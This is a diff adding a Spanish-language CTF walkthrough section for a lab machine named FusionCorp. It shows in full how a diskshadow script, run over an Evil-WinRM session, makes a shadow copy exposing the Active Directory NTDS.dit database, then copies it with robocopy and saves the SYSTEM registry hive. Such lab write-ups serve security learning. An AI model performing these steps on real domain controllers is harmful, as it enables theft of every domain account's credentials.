@@ -400,13 +400,150 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
            es un componente crítico de la base de datos de Microsoft Windows Active Directory.
            Active Directory es un servicio de directorio utilizado por servidores Windows para almacenar
            información sobre objetos en una red, como cuentas de usuario, cuentas de computadoras y pertenencias a grupos.
-    
-    -Abusando de la base de datos de Active Directory NTDS.dit
 
-      Informacion:
+    Informacion del ataque a realizar:
+    
       [+]https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#ataque-a-d
     
       [+]https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow
+    
+      - Abusando de la base de datos de Active Directory NTDS.dit
+
+        1)Creamos el script que va a ejecutar diskshadow y lo subimos a la maquina victima.
+
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
+            └─# cat content/script_shadow.txt
+        
+            set verbose on;                               ---> Habilita la salida detallada 
+            set context clientaccessible;                 ---> Especifica que las versiones cliente de Windows pueden utilizar la instantánea. Este contexto es persistente de forma predeterminada.
+            set context persistent;                       ---> Especifica que la instantánea persiste al salir, restablecer o reiniciar el programa.
+            begin backup;
+            add volume C:\Windows\NTDS\ alias ntdsdrive;  ---> Agrega un volumen al conjunto de instantáneas, volúmenes que se van a copiar. 
+            create;
+            expose %ntdsdrive% X:;                        ---> Expone una instantánea persistente como letra de unidad, recurso compartido o punto de montaje.
+            end backup;
+            exit;
+
+            
+            *Evil-WinRM* PS C:\temp> upload content/script_shadow.txt                             
+            Info: Uploading /home/kali/Desktop/ctf/try_ctf/FusionCorp/content/script_shadow.txt to C:\temp\script_shadow.txt                                     
+            Data: 232 bytes of 232 bytes copied                                       
+            Info: Upload successful!
+
+        2)Ejecutamos script
+
+            *Evil-WinRM* PS C:\temp> diskshadow /s script_shadow.txt
+            Microsoft DiskShadow version 1.0
+            Copyright (C) 2013 Microsoft Corporation
+            On computer:  FUSION-DC,  10/15/2023 12:29:59 AM
+            
+            -> set verbose on
+            -> set context clientaccessible
+            -> set context persistent
+            -> begin backup
+            -> add volume C:\Windows\NTDS\ alias ntdsdrive
+            -> create
+            Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
+            Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,
+            because it requires volume  which is not in the shadow copy set.
+            The writer "ASR Writer" is now entirely excluded from the backup because the top-level
+            non selectable component "\BCD\BCD" is excluded.
+            
+            * Including writer "Task Scheduler Writer":
+                    + Adding component: \TasksStore
+            
+            * Including writer "VSS Metadata Store Writer":
+                    + Adding component: \WriterMetadataStore
+            
+            * Including writer "Performance Counters Writer":
+                    + Adding component: \PerformanceCounters
+            
+            * Including writer "System Writer":
+                    + Adding component: \System Files
+                    + Adding component: \Win32 Services Files
+            
+            * Including writer "WMI Writer":
+                    + Adding component: \WMI
+            
+            * Including writer "Registry Writer":
+                    + Adding component: \Registry
+            
+            * Including writer "NTDS":
+                    + Adding component: \C:_Windows_NTDS\ntds
+            
+            * Including writer "DFS Replication service writer":
+                    + Adding component: \SYSVOL\3656A825-08E2-4C77-82F0-0F07EC965204-BFD185EF-4D5F-44A5-950B-C2222C20A32C
+            
+            * Including writer "COM+ REGDB Writer":
+                    + Adding component: \COM+ REGDB
+            
+            Alias ntdsdrive for shadow ID {1d5fadb8-6810-414b-9daf-9abbf1ab7443} set as environment variable.
+            Alias VSS_SHADOW_SET for shadow set ID {3614fe2a-3c60-449b-80d2-1820ad0d79c2} set as environment variable.
+            Inserted file Manifest.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file BCDocument.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM0.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM1.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM2.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM3.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM4.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM5.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM6.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM7.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM8.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM9.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file WM10.xml into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            Inserted file DisB4EA.tmp into .cab file 2023-10-15_12-30-32_FUSION-DC.cab
+            
+            Querying all shadow copies with the shadow copy set ID {3614fe2a-3c60-449b-80d2-1820ad0d79c2}
+            
+                    * Shadow copy ID = {1d5fadb8-6810-414b-9daf-9abbf1ab7443}               %ntdsdrive%
+                            - Shadow copy set: {3614fe2a-3c60-449b-80d2-1820ad0d79c2}       %VSS_SHADOW_SET%
+                            - Original count of shadow copies = 1
+                            - Original volume name: \\?\Volume{66a659a9-0000-0000-0000-602200000000}\ [C:\]
+                            - Creation time: 10/15/2023 12:30:30 AM
+                            - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                            - Originating machine: Fusion-DC.fusion.corp
+                            - Service machine: Fusion-DC.fusion.corp
+                            - Not exposed
+                            - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                            - Attributes:  No_Auto_Release Persistent Differential
+            
+            Number of shadow copies listed: 1
+            -> expose %ntdsdrive% X:
+            -> %ntdsdrive% = {1d5fadb8-6810-414b-9daf-9abbf1ab7443}
+            The shadow copy was successfully exposed as X:\.
+            -> end backup
+            -> exit
+
+        3) La copia se ha creado correctamente y en estos momentos tenemos el fichero ntds.dit en x:\windows\ntds\ntds.dit
+
+           -Copiamos dicho fichero de x:\windows\ntds\ntds.dit --> C:\temp
+           
+                *Evil-WinRM* PS x:\windows\ntds> robocopy /B .\ c:\temp ntds.dit
+                
+                -------------------------------------------------------------------------------
+                   ROBOCOPY     ::     Robust File Copy for Windows
+                -------------------------------------------------------------------------------
+                
+                  Started : Sunday, October 15, 2023 12:38:08 AM
+                   Source : x:\windows\ntds\
+                     Dest : c:\temp\
+                
+                    Files : ntds.dit
+                
+                  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+            -Extraemos del registro de windows una copia de SYSTEM, lo vamos a necesitar.
+
+                *Evil-WinRM* PS C:\temp> reg save HKLM\SYSTEM SYSTEM
+                The operation completed successfully.
+
+
+          
+
+          
+
+      
       
      
 
